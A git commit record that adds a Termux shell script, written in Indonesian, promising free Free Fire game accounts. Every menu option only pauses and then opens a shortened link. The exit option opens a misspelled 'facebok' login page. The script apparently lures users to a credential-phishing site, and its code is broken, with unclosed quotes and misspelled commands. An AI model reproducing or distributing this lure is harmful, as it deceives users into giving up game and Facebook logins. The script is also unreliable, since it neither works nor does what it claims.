58521c17f78100a87044b8ba2a884f0ba6925cc3
Faizulboften <72049391+Faizulboften@users.noreply.github.com>
2020-10-02 14:27:56 +0800

    Create freefiregratis.sh

---
+++ freefiregratis.sh
@@ -0,0 +1,56 @@
+clear
+echo $cyan " LOGIN DULU BIAR DAPAT"
+sleep 10
+open-termux https://soo.gd/5GN1
+bi='\033[34;1m' #biru
+ij='\033[32;1m' #ijo
+pr='\033[35;1m' #purple
+cy='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #putih
+ku='\033[33;1m' #kuning
+or='\033[1;38;5;208m' #Orange
+echo $me "
+●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
+     🔴NOTE  : NO RECODE
+     ⭕LOGIN : AKUN KAMU
+●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●"
+
+echo $or "
+  ●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
+        📂 EMAIL    : LOG IN
+        📂 PASSWORD : LOG IN
+  ●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
+  
+═══════════════════════════════════════
+[1] 🔓 AMBIL AKUN FREE FIRE GRATIS 🔓
+═══════════════════════════════════════
+[2] 🔓 LOGIN DULU CUK 🔓
+═══════════════════════════════════════
+┗────[99] exit ✘"
+echo '\033[35;1m'
+read -p "root@Pilih Nomor > " bro
+
+
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+echo $cyan " LOGIN DULU CUK
+sleep 10
+open-termux https://soo.gd/5GN1
+fi
+
+if [ $bro = 2 ] || [ $bro = 2]
+then
+clear
+echo $cyan " LOGIN DULU CUK
+sleep 10
+open-termux https://soo.gd/5GN1
+fi
+
+if [ $bro = 99 ] || [ $bro = 99 ]
+then
+echo $cyan  "Subscribe Channel Htc Ctr Gaming "
+open-ternux m.facebok.login.php
+exit
+fi
